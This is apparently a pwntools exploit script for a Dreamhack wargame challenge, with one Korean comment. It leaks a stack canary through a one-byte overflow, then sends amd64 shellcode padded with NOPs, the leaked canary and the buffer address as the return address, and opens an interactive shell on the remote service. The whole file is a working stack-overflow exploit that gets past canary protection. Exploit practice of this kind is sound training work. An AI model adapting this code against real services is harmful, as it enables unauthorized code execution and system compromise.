from pwn import *

# Must be updated
p = remote("host3.dreamhack.games", 10635)

p.recvuntil(b'buf: ')
buf_addr = int(p.recvline(keepends=False), 16)

p.recvuntil(b'$rbp: ')
offset = int(p.recvline())

# Canary Leak
payload = b'A' * ((offset - 8) + 1)              # +1을 하는 이유는 canary가 null부터 시작하기 때문
p.sendlineafter(b'Input: ', payload)
p.recvuntil(payload)
canary = u64(b'\00' + p.recv(7))

# Shell code
context.arch = "amd64"
sh = asm(shellcraft.sh())
payload = sh.ljust(offset-8, b'\x90') + p64(canary) + b'\x90'*0x08 + p64(buf_addr)

p.sendafter(b'Input: ', payload)
p.interactive()
